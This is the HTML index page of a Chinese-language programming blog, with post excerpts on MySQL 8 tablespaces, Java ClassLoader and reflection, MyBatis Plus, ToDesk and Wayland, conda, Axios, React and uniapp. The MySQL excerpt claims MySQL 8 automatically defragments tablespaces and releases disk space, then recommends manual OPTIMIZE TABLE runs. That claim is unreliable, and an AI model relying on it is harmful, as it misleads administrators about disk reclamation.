<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e809b1049332c9f01f33f365aea8f5b/" rel="bookmark">
			mysql8 表空间回收是自动管理的 到达阈值释放回收磁盘空间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		表空间
InnoDB其实是使用页为基本单位来管理存储空间的，默认的页的大小为 16KB。对于InnoDB存储引擎来讲，每个索引都对应着一棵B+树，该B+树的每个节点都是一个数据页，数据页之间不必要是物理连续的，因为数据页之间有双向链表来维护着这些页的顺序。
InnoDB的聚簇索引(也就是主键索引文件)的叶子节点存储了完整的用户记录。
为了更好的管理这些页，InnoDB提出了一个表空间或者文件空间(table space or file space)的概念。这个表空间是一个抽象的概念，它可以对应文件系统上一个或多个真实文件(不同表空间对应的文件数量可能不同)。每一个表空间可以被划分为很多个页，我们的表数据就存放在某个表空间下的某些页里
在MySQL 8中，表空间回收是自动管理的，不需要手动干预。当表中的数据被删除时，表空间会自动释放被使用的空间。
在MySQL 8中，表空间回收不再由数据库管理员手动管理，而是由MySQL自动管理。从MySQL 8开始，InnoDB存储引擎引入了一个新的特性，称为"自动表空间碎片整理"。
在之前的MySQL版本中，当删除或更新表中的数据时，可能会导致表空间的碎片产生。这些碎片会占用额外的磁盘空间，并且需要进行手动整理以回收这些空间。然而，在MySQL 8中，InnoDB引擎会自动检测和整理这些表空间的碎片，无需手动干预。
当表空间的碎片达到一定数量时，InnoDB引擎会自动进行整理操作。这个过程是透明的，对数据库的日常操作没有影响。你只需要确保你有足够的磁盘空间来存储整理过程中产生的临时文件。
需要注意的是，虽然MySQL 8会自动管理表空间的回收，但你仍然可以手动执行表空间的维护和优化操作。例如，你可以使用ALTER TABLE语句进行表的重组织或重建，或者使用OPTIMIZE TABLE语句进行表空间的优化。这些操作可以帮助你更好地管理数据库的性能和空间使用。
MySQL8.0自带工具ibd2sdi解析ibd文件 MySQL8.0自带工具ibd2sdi解析ibd文件_ibd文件怎么打开_HumoChen99的博客-CSDN博客
MySQL5.6中默认是独立表空间Tablespace(表空间管理类型就这2种)
独立表空间 就是采用和MyISAM 相同的方式, 每个表拥有一个独立的数据文件( .idb )
InnoDB引擎 frm ibd文件说明：
1.frm ：描述表结构文件，字段长度等
2.ibd文件 是表数据文件
mysql5.6既有D:\java\mysql5.6\data\ipvacloudreport_site_day.frm 又有 D:\java\mysql5.6\data\ipvacloud\report_site_day.ibd文件
一，小结
结合mysql官方网站的信息，个人是这样理解的。当你删除数据时，mysql并不会回收，被已删除数据的占据的存储空间，以及索引位。而是空在那里，而是等待新的数据来弥补这个空缺，这样就有一个缺少，如果一时半会，没有数据来填补这个空缺，那这样就太浪费资源了。所以对于写比较频烦的表，要定期进行optimize，一个月一次，看实际情况而定了。
举个例子来说吧。有100个php程序员辞职了，但是呢只是人走了，php的职位还在那里，这些职位不会撤销，要等新的php程序来填补这些空位。招一个好的程序员，比较难。我想大部分时间会空在那里。哈哈。
当我们使用mysql进行delete数据，delete完以后，发现空间文件ibd并没有减少，这是因为碎片空间的存在，举个例子，一共公司有10号员工，10个座位，被开除了7个员工，但这些座位还是保留的，碎片整理就像，让剩下的3个员工都靠边坐，然后把剩下的7个作为给砸掉，这样就能释放出空间了
好处除了减少表数据与表索引的物理空间，还能降低访问表时的IO，这个比较理解，整理之前，取数据需要跨越很多碎片空间，这时需要时间的，整理后，想要的数据都放在一起了，直接拿就拿到了，效率提高
-- 清除碎片操作会暂时锁表，数据量越大，耗费的时间越长 可以做个脚本，例如每月凌晨3点，检查DATA_FREE字段，
-- 大于自己认为的警戒值(碎片空间占数据和数据索引空间之和的百分比&gt;0.30)的话，就清理一次
/*
清理mysql下实例下表碎片(当碎片字节空间占 数据字节与索引字节空间 之和大于0.30时, 这些表的碎片都需要清理,使用游标遍历清理) 定时任务事件 每月凌晨4点调用此清理表碎片的任务
table_schema是数据库名 OPTIMIZE TABLE ipvacloud.article;
*/
DROP PROCEDURE IF EXISTS `optimize_table`; DELIMITER ;; CREATE PROCEDURE `optimize_table`() BEGIN DECLARE tableSchema VARCHAR(100); DECLARE tableName VARCHAR(100); DECLARE stopFlag INT DEFAULT 0; -- 大于30%碎片率的清理 DECLARE rs CURSOR FOR SELECT table_schema,table_name FROM information_schema.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e809b1049332c9f01f33f365aea8f5b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab41bff5cd885c58e97c8140a7fe955f/" rel="bookmark">
			为什么 ClassLoader 类的 getResource(String name) 方法能够读取到原本在 src/main/resources 里面的文件？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么 ClassLoader 类的 getResource(String name) 方法能够读取到原本在 src/main/resources 里面的文件？ 文章目录 为什么 ClassLoader 类的 getResource(String name) 方法能够读取到原本在 src/main/resources 里面的文件？1、类路径和资源文件2、ClassLoader 的层次结构3、getResource 方法的工作原理4、使用 `ClassLoader` 类图示5、仅使用 `FileInputStream` （不推荐，也不合理） 在 Java 开发中，ClassLoader 类是一个关键的组件，用于加载类和资源。其中，getResource(String name) 方法允许我们在类路径中查找指定名称的资源文件。一个常见的疑问是：为什么这个方法能够轻松地读取到Maven项目中src/main/resources目录下的文件呢？
1、类路径和资源文件 在Maven项目中，源代码通常存放在src/main/java目录下，而资源文件则存放在src/main/resources目录下。这样的组织结构是为了在构建过程中能够清晰地分离代码和资源。
在编译时，Maven将src/main/resources目录下的文件复制到类路径中，通常是target/classes目录。这意味着编译后，资源文件就变成了类路径的一部分。
2、ClassLoader 的层次结构 ClassLoader 类的设计支持层次结构，其中每个类加载器都有一个父类加载器。当类加载器需要加载类或资源时，它首先会尝试从父加载器中查找，然后再从自身的类路径中查找。
这机制为ClassLoader提供了一种委托机制，确保资源的查找是层次化的，逐级向上寻找，直至找到为止。
3、getResource 方法的工作原理 ClassLoader 的 getResource(String name) 方法实际上是利用了这一层次结构的委托机制。它首先尝试调用父加载器的 getResource 方法，如果父加载器找不到资源，再从自己的类路径中查找。这保证了在整个类加载器层次结构中，资源文件可以被有效地定位。
因此，当我们使用ClassLoader的 getResource 方法时，它会顺着类加载器的层次结构，最终在编译后的类路径中找到src/main/resources目录下的文件。
4、使用 ClassLoader 类图示 5、仅使用 FileInputStream （不推荐，也不合理） 该路径是相对路径，并且是相对于项目的根目录的。
这么写是不合理的！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d812c6ba40d4f972ed47223228d9e016/" rel="bookmark">
			MyBatis Plus分页查询部分字段
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QueryWrapper 查询指定某字段以外的数据
QueryWrapper&lt;AssociationMember&gt; queryWrapper = new QueryWrapper&lt;&gt;(); //查询指定某字段以外的数据 queryWrapper.select(AssociationMember.class, info -&gt;!info.getColumn().equals("photo")); IPage&lt;AssociationMember&gt; page = new Page&lt;&gt;(); page.setCurrent(getWorkerMemberInfoReqVo.getCurrentPage()); page.setSize(getWorkerMemberInfoReqVo.getPageSize()); IPage&lt;AssociationMember&gt; iPage=associationMemberMapper.selectPage(page,queryWrapper); 查询指定字段的数据
QueryWrapper&lt;Member&gt; queryWrapper = new QueryWrapper&lt;&gt;(); //查询指定字段的数据 queryWrapper.select("id","name").lambda().eq(StringUtils.isNotBlank(pageQueryMemberListReqVO.getOrgCoding()),Member::getOrgCoding,pageQueryMemberListReqVO.getOrgCoding()); List&lt;Member&gt; list=memberMapper.selectList(queryWrapper); lambdaQuery 单个字段查询
myService.list(Wrappers.&lt;Demo&gt;lambdaQuery().select(Demo::getId)); 多个字段查询
myService.list(Wrappers.&lt;Demo&gt;lambdaQuery().select(Demo::getId, Demo::getAge)); 单个字段排除
// 对应实体类字段 myService.list(Wrappers.&lt;Demo&gt;lambdaQuery().select(Demo.class, i -&gt; !"rName".equals(i.getProperty()))); // 对应数据库字段 myService.list(Wrappers.&lt;Demo&gt;lambdaQuery().select(Demo.class, i -&gt; !"r_name".equals(i.getColumn()))); 多个字段排除
// 对应实体类字段 myService.list(Wrappers.&lt;Demo&gt;lambdaQuery().select(Demo.class, i -&gt; !"rName".equals(i.getProperty()) &amp;&amp; !"age".equals(i.getProperty()))); // 对应数据库字段 myService.list(Wrappers.&lt;Demo&gt;lambdaQuery().select(Demo.class, i -&gt; !"r_name".equals(i.getColumn()) &amp;&amp; !"age".equals(i.getColumn()))); 实体类使用注解排除
/** * 不返回字段的值，但单独查询该字段就可以返回值 * myService.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d812c6ba40d4f972ed47223228d9e016/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1bc8aa19b6c053438ec9b4111599ab08/" rel="bookmark">
			Java 类之 java.lang.reflect.Field
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java 类之 java.lang.reflect.Field 文章目录 Java 类之 java.lang.reflect.Field一、概述1、java.lang.Class 类获取字段的方法获取全部公有字段（含继承的，不含私有的）获取本类的所有字段（不含继承的，含私有的）代码示例 2、java.lang.reflect.Field 类简介3、类定义信息 二、基本功能1、基本功能2、代码示例 三、扩展1、关于注解的方法2、`getAnnotations()` 与 `getDeclaredAnnotations()` 的区别`getAnnotation` 方法`getDeclaredAnnotation` 方法 3、其他注意点 一、概述 1、java.lang.Class 类获取字段的方法 获取全部公有字段（含继承的，不含私有的） getField(String name)： 获取该类及其父类指定名称的公有字段。如果字段不存在，则抛出 NoSuchFieldException 异常。 getFields()： 获取该类及其父类中所有公有字段的数组。返回一个 Field 对象数组。 获取本类的所有字段（不含继承的，含私有的） getDeclaredField(String name)： 获取该类中指定名称的任意访问权限的字段，包括私有字段。如果字段不存在，则抛出 NoSuchFieldException 异常。 getDeclaredFields()： 获取该类中所有声明的字段，包括私有字段。返回一个 Field 对象数组。 代码示例 // 获取公有字段（含继承的，不含私有的） Field publicField = MyClass.class.getField("publicField"); System.out.println("Public Field: " + publicField); // 获取所有公有字段（含继承的，不含私有的） Field[] publicFields = MyClass.class.getFields(); System.out.println("All Public Fields: "); for (Field field : publicFields) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1bc8aa19b6c053438ec9b4111599ab08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/becfa05b8c5de8e2b79ac5aeef6379e0/" rel="bookmark">
			C语言10进制与16进制转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在做一个模拟量模块的485通讯时，控制模拟量输出的协议格式是将需要输出的真实电压值（0~10V）数据扩大1000倍后转换成16进制数据，一般情况数据转换后为4位16进制数据（0xWXYZ），协议需要的是两个2位的数据0xWX和0xYZ，由此写出以下代码
#include &lt;stdio.h&gt; unsigned int DATA_HEX; unsigned int DATA_H; unsigned int DATA_L; unsigned int HEX_TEMP[] = {0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F}; unsigned int HEX_ARR[4];//我的数据只需要4位16进制数据 void HEX_TO_DEC(unsigned int val) { unsigned int i = 0; while(val) { HEX_ARR[i++] = HEX_TEMP[val%16]; val /= 16; } DATA_HEX = HEX_ARR[3]*0x1000 + HEX_ARR[2]*0x0100 + HEX_ARR[1]*0x0010 + HEX_ARR[0];//4位16进制 DATA_H = HEX_ARR[3]*0x10 + HEX_ARR[2];//2位16进制 DATA_L = HEX_ARR[1]*0x10 + HEX_ARR[0]; } int main() { unsigned int val = 5036;//待转换数据，16进制表示位0x13AC HEX_TO_DEC(val);//转换 //打印结果 printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/becfa05b8c5de8e2b79ac5aeef6379e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47b9ccac2bdb63d23d591ef27fe9e6f9/" rel="bookmark">
			当前系统并无桌面环境，或无显示器，无法显示远程桌面，您需要自行安装X11桌面环境，或者使用终端文件功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ToDesk远程遇到的问题如上图，换向日葵直接黑屏；
问题原因
截止发文时间，Todesk只支持X11协议，没有适配最新的Wayland协议，所以我们需要把窗口系统调整为X11才可以。
解决方法
修改配置文件，关闭wayland
sudo vim /etc/gdm3/custom.conf
1.把#WaylandEnable=false前的#号删掉
重启
reboot
重启完成后，todesk就可以远程连接了。
背景知识
我们能看到的图形界面（GUI）都依赖于显示服务器（Display Server）。显示服务器（Display Server）是任何图形用户界面（尤其是窗口系统）中的关键组件。它是图形用户界面（GUI）的基本组件，位于图形界面和内核之间。借助显示服务器（Display Server），我们才可以将计算机与GUI一起使用。没有它，我们将只能使用命令行界面（TTY）。
桌面环境(Gnome、KDE、Xfce、MATE等)使用了底层的显示服务器
因为X系列协议（X11表示X协议11代版本）已经存在很久了，有一些历史设计包袱。所以Linux为了更安全合理。Ubuntu 21.04之后，现在默认启用Wayland协议了。但是也正因为X11协议已经在市场上存续了很多年，所以很多软件还是基于X11实现的，这就导致了一些不兼容的问题。在未来或许还是Wayland协议的天下。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56ced15287a2101df5436f82d44b5c43/" rel="bookmark">
			【概率论】正态分布的叠加性和正态分布的标准化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1 引言2 什么是正态分布2 正态分布的叠加性3 正态分布的标准化4 参考文献 1 引言 正态分布又称为高斯分布，它在机器学习和深度学习中非常常用。如正态分布的叠加性和正态分布的标准化等，在VAE模型中重参技巧就用到了正态分布知识，特别是在高维数据中高维的正态分布更是常用。因此，准备梳理一下相应的知识，其中内容多有参考其他博客，一并在参考文献中给出链接。
2 什么是正态分布 正态分布（Normal distribution），又名高斯分布（Gaussian distribution）。若随机变量 X X X服从一个数学期望（均值）为 μ μ μ、方差为 σ 2 σ^2 σ2的正态分布，记为 N ( μ , σ 2 ) N(μ, σ^2) N(μ,σ2)。其概率密度函数为正态分布的期望值 μ μ μ决定了其位置，其标准差 σ σ σ决定了分布的幅度。当 μ = 0 μ = 0 μ=0, σ = 1 σ = 1 σ=1时的正态分布是标准正态分布。
一维正态分布的概率密度函数为：
f ( x ) = 1 2 π σ exp ⁡ ( − ( x − μ ) 2 2 σ 2 ) f(x)=\frac{1}{\sqrt{2 \pi} \sigma} \exp \left(\frac{-(x-\mu)^{2}}{2 \sigma^{2}}\right) f(x)=2π ​σ1​exp(2σ2−(x−μ)2​)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/56ced15287a2101df5436f82d44b5c43/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eaa428055c18ea881b4bd4f09b9ecb1c/" rel="bookmark">
			conda在Py配置环境中报错:The current user does not have write permissions to the target environment当前用户没有写入权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题1:在Winodws 10下使用pycharm2022配置环境时报错：”EnvironmentNotWritableError: The current user does not have write permissions to the target environment. location：
问题2:以及配置环境过程中可执行文件出现anaconda根目录下的_conda.exe或者Scripts的conda.exe为无效,无法使用conda的部分包。
主要原因1:用户没有对anaconda3文件夹的读写权限，造成其原因可能是由于在安装anaconda时使用了管理员权限
主要原因2:用户没有对anaconda进行系统环境配置
解决方法1：将pycharm配置环境中的位置加载为C盘目录的用户名下，anaconda安装时会产生一个conda的文件夹，此时就不会报错权限问题
解决方法2：打开高级系统设置，将系统环境以及path配置好
-添加环境变量（G:\anaconda为我自己的conda安装目录） condaRootPath E:\anaconda
path路径新建内容
%condaRootPath%
%condaRootPath%\Scripts\
%condaRootPath%\Library\bin\
%condaRootPath%\Library\mingw-w64\bin\
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ad0fe3fcc79fec1e3fe428099e51033/" rel="bookmark">
			Vue 中简易封装网络请求（Axios），包含请求拦截器和响应拦截器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue 中简易封装网络请求（Axios），包含请求拦截器和响应拦截器 axios简介 Axios 是一个基于 promise 的网络请求库，可以用于浏览器和 node.js
Axios官方中文文档
特性 从浏览器创建 XMLHttpRequests从 node.js 创建 http 请求支持 Promise API拦截请求和响应转换请求和响应数据取消请求超时处理查询参数序列化支持嵌套项处理自动将请求体序列化为：
JSON (application/json)
Multipart / FormData (multipart/form-data)
URL encoded form (application/x-www-form-urlencoded)将 HTML Form 转换成 JSON 进行请求自动转换JSON数据获取浏览器和 node.js 的请求进度，并提供额外的信息（速度、剩余时间）为 node.js 设置带宽限制兼容符合规范的 FormData 和 Blob（包括 node.js）客户端支持防御XSRF 安装 npm install axios; 示例代码 https.js
import axios from "axios"; // const token = localStorage.getItem("accessToken"); export const https = axios.create({ baseURL: "http://localhost:3000", timeout: 15000, headers: {}, }); // 添加请求拦截器 https.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ad0fe3fcc79fec1e3fe428099e51033/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7da0b41875682495d8a8210c09579b8/" rel="bookmark">
			计算机类编程课学生编写的代码应该如何管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		管理学生编写的代码是一个重要的任务，以下是几种常见的方式来有效地管理学生的代码：
版本控制系统：使用版本控制系统（如Git）来管理学生的代码。每个学生都可以在自己的分支上进行开发，并通过提交请求（pull request）将代码合并到主干分支。这样可以轻松跟踪代码的修改历史，并提供一个集中的代码库进行协作和审查。
项目结构规范：定义一套统一的项目结构规范，包括文件命名约定、目录结构等。这样可以使代码更易于理解和维护，并提高团队合作效率。
代码审查：定期对学生的代码进行审查，发现问题并提出改进建议。代码审查有助于提高代码质量、规范性和可读性，并促进学生之间的知识分享和学习。
文档和注释：鼓励学生编写清晰的文档和注释，以解释代码的功能、设计思路和关键逻辑。这有助于其他人理解代码，并为日后的维护工作提供帮助。
集成开发环境（IDE）：推荐学生使用功能强大的集成开发环境，如PyCharm、Visual Studio Code等。这些IDE提供了许多有用的工具和功能，如调试器、代码自动完成等，可以提高编写代码的效率和质量。
定期备份：确保学生的代码定期进行备份，以防止意外数据丢失或损坏。可以使用云存储服务（如GitHub、GitLab等）或本地备份方案来保护代码。
持续集成（CI）：使用持续集成工具（如Jenkins、Travis CI等）来自动化构建、测试和部署学生的代码。这可以帮助及早发现和解决潜在问题，并提高代码交付的质量和稳定性。
以上是一些建议来管理学生编写的代码。通过合理的管理和规范，可以提高学生的编程能力，促进团队合作，并为日后的工作打下良好的基础。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d01b61ad15b423b93511137f2057ea2/" rel="bookmark">
			深度学习卫星遥感图像检测与识别 -opencv python 目标检测 计算机竞赛
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0 前言1 课题背景2 实现效果3 Yolov5算法4 数据处理和训练5 最后 0 前言 🔥 优质竞赛项目系列，今天要分享的是
🚩 **深度学习卫星遥感图像检测与识别 **
该项目较为新颖，适合作为竞赛课题方向，学长非常推荐！
🥇学长这里给一个题目综合评分(每项满分5分)
难度系数：3分工作量：3分创新点：5分 🧿 更多资料, 项目分享：
https://gitee.com/dancheng-senior/postgraduate
1 课题背景 近年来,世界各国大力发展航空航天事业,卫星图像的目标检测在各行各业的应用得到了快速的发展,特别是军事侦查、海洋船舶和渔业管理等领域。由于卫星图像中有价值的信息极少,卫星图像数据规模巨大,这迫切需要智能辅助工具帮助相关从业人员从卫星图像中高效获取精确直观的信息。
本文利用深度学习技术，基于Yolov5算法框架实现卫星图像目标检测问题。
2 实现效果 实现效果如下：可以看出对船只、飞机等识别效果还是很好的。
3 Yolov5算法 简介
下图所示为 YOLOv5 的网络结构图，分为输入端，Backbone，Neck 和 Prediction 四个部分。其中，
输入端包括 Mosaic 数据增强、自适应图片缩放、自适应锚框计算，Backbone 包括 Focus 结构、CSP
结 构，Neck 包 括 FPN+PAN 结 构，Prediction 包 括GIOU_Loss 结构。
相关代码
​
class Yolo(object): def __init__(self, weights_file, verbose=True): self.verbose = verbose # detection params self.S = 7 # cell size self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d01b61ad15b423b93511137f2057ea2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/138c9f449dab80191610ee237923025b/" rel="bookmark">
			SSM框架Demo: 简朴博客系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 前端页面效果2. 项目创建3. 前期配置3.1. 创建数据库数据表3.2. 配置文件 4. 创建实体类5. 统一处理5.1. 统一返回格式处理5.2. 统一异常处理 6. 全局变量7. Session工具类8. 登录拦截器9. 密码加盐加密10. 线程池组件11. dao层11.1. UserMapper11.2. ArticleMapper 12. 服务层service12.1. UserService12.2. ArticleService 13. 核心—控制层controller13.1. UserController13.1.1. 注册功能13.1.2. 登录功能13.1.3. 注销功能13.1.4. 判断当前用户是否登录 13.2. ArticleController13.2.1. 返回当前登录用户的文章列表13.2.2. 删除文章功能13.2.3. 查看文章详情功能13.2.4. 更新文章阅读量13.2.5. 添加文章13.2.6. 修改文章13.2.6.1. 页面初始化13.2.6.2. 发布修改后的文章 13.2.7. 根据分页来查询汇总列表 14. Session升级存储到Redis15. 项目部署16. 项目亮点 简朴博客系统：简单朴素… 1. 前端页面效果 ♨️注册页
包含以下用户信息：
用户名密码 ♨️登录页
包含以下用户信息：
用户名密码 ♨️文章详情页
登录状态下“登录”按钮变为“注销”按钮。
包含以下用户信息：
博文作者 id代码仓库链接文章总数 包含以下博文信息：
作者 id文章 id标题时间正文阅读量 ♨️个人博客列表页
包含以下博文信息：
标题时间摘要 ♨️文章汇总列表页
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/138c9f449dab80191610ee237923025b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/707a486e9e90139e8b2c883aefe8a399/" rel="bookmark">
			ROS tf使用报错：ImportError: dynamic module does not define module export function (PyInit__tf2)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		研究小车导航需要用到GPS，小车的系统是ubuntu16.04，python3的默认版本是3.5，ROS是kinetic版本。 随笔 买了一块GPS+惯导模块进行使用，商家提供的教程和例子可以直接通过ROS获取GPS及IMU等数据，但是需要以来tf2包，能看到这篇文章，说明你清楚的知道这是一个好难受的事情，因为这个问题在ubuntu20.04被解决了，甚至ubuntu18.04解决起来也很简单（笔者现在18.04服务器上解决了这个问题：参考知乎一路绿通：解决python3无法使用ROS中tf的问题 - 知乎 (zhihu.com)）。
笔者预先有感觉ubuntu16.04会比18.04遇到很多问题，但也觉得就是遇到问题度娘来帮，不行还有ChatPGT打下手，结果发现还是年轻了，不得不重操旧业看起日志一步步解决了，这一篇文章中间会存在一些遗漏的点，因为笔者昨晚上从4点操作到了9点没有解决，早上来了又浪费了2小时才搞定最后一步的小问题，周期比较长所以只能凭剩余的印象来找补找补了。
回归正文：
问题 使用python 导入tf库时遇到如下的问题（基本上都是吧）
&gt;&gt;&gt; import tf
Traceback (most recent call last):
File "&lt;stdin&gt;", line 1, in &lt;module&gt;
File "/opt/ros/kinetic/lib/python2.7/dist-packages/tf/__init__.py", line 28, in &lt;module&gt;
from tf2_ros import TransformException as Exception, ConnectivityException, LookupException, ExtrapolationException
File "/opt/ros/kinetic/lib/python2.7/dist-packages/tf2_ros/__init__.py", line 38, in &lt;module&gt;
from tf2_py import *
File "/opt/ros/kinetic/lib/python2.7/dist-packages/tf2_py/__init__.py", line 38, in &lt;module&gt;
from ._tf2 import *
ImportError: dynamic module does not define module export function (PyInit__tf2)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/707a486e9e90139e8b2c883aefe8a399/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afbee11eb986198c7a557428c3333a4e/" rel="bookmark">
			react 组件进阶
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目标：1.能够使用props接收数据
2.能够实现父子组建之间的通讯
3.能够实现兄弟组建之间的通讯
4.能够给组建添加props校验
5.能够说出生命周期常用的钩子函数
6.能够知道高阶组件的作用
一，组件通讯介绍 组件是独立且封闭的单元，默认情况下，只能使用组件自己的数据。在组件化过程中，我们将一个完整的功能拆分成多个组件，以更好的完成整个应用的功能，而在这个过程中，多个组件之间不可避免的要共享某些数据。为了实现这些功能，就需要打破组建的独立封闭性，让其与外界沟通，这个过程就是组件通讯。
二，组件的props 组建是封闭的，要接受外部数据应该通过props来实现
props的作用：接收传递给组件的数据
传递数据：给组件标签添加属性
接收数据：函数组件通过参数props接收数据，类组件通过this.props接受数据
组件的特点：
1.可以给组件传递任意类型的数据
2.props 是只读的对象，只能读取属性的值，无法修改对象
3.注意：使用类组建时，如果写了构造函数，应该将props传递给super（），否在无法在构造函数中获取到props。
三，组建通讯的三种方式 1.父组件 -&gt; 子组件
1.父组件提供眼传递的state数据
2.给子组件标签添加属性，值为state 中的数据
3.子组件中通过props 接收父组建中传递的数据
2.子组件 -&gt; 父组件
思路：利用回调函数，父组件提供回调，子组件调用，将要传递的数据作为回调函数的参数。
1.父组件提供一个回调函数（用于接受数据）
2.将该函数作为属性的值，传递给子组件
3.兄弟组件
将共享状态提升到最近的公共父组件中，由公共父组件管理这个状态
思路：状态提升
公共父组件职责，1，提供共享状态 2，提供操作共享状态的方法
要通讯的子组建只需要通过 props 接收状态或操作状态的方法
四，Context 思考：App组件要传递数据给Child 组件，该如何处理？
更好的姿势：使用 Context
作用：跨组件传递数据（比如：主题，语言等）
使用步骤：
1.调用React.createContext() 创建Provider（提供数据）和 Consumer （消费数据）两个组件
2.使用 Provider 组件作为父节点
3.设置value 属性，表示要传递的数据
4.调用Consumer 组件接收数据。
总结：
1.如果两个组件是远方亲戚（比如：嵌套多层）可以使用Context实现通讯
2.Context 提供李两个组件：Provider 和 Consumer 3.Provider 组件：用来提供数据
4.Consumer组建：用来消费数据
五，props深入 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afbee11eb986198c7a557428c3333a4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ccd2441cdc5a9abd421ce1e36f70299/" rel="bookmark">
			uniapp相关记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、自定义我的物品组件 my_goods.vue
&lt;template&gt; &lt;view class="goods-item"&gt; &lt;!-- 左侧 --&gt; &lt;view class="goods-item-left"&gt; &lt;radio :checked="goods.goods_state" color="#c00000" v-if="showRadio" @click="radioClickhandler"&gt;&lt;/radio&gt; &lt;image :src="goods.goods_small_logo || defaultPic" class="goods-pic"&gt;&lt;/image&gt; &lt;/view&gt; &lt;!-- 右侧 --&gt; &lt;view class="goods-item-right"&gt; &lt;!-- 商品名字 --&gt; &lt;view class="goods-name"&gt;{{goods.goods_name}}&lt;/view&gt; &lt;view class="goods-info-box"&gt; &lt;view class="good-price"&gt;￥{{goods.goods_price}}&lt;/view&gt; &lt;uni-number-box :min="1" :max="9999" :value="goods.goods_count" v-if="showNum" @change="numChangeHandler"&gt;&lt;/uni-number-box&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;/template&gt; &lt;script&gt; export default { props: { // 商品的信息对象 goods: { type: Object, defaul: {}, }, showRadio: { type: Boolean, // 默认不展示 radio 组件 default: false }, showNum: { type: Boolean, default: false } }, data() { return { // 默认的图片 defaultPic: 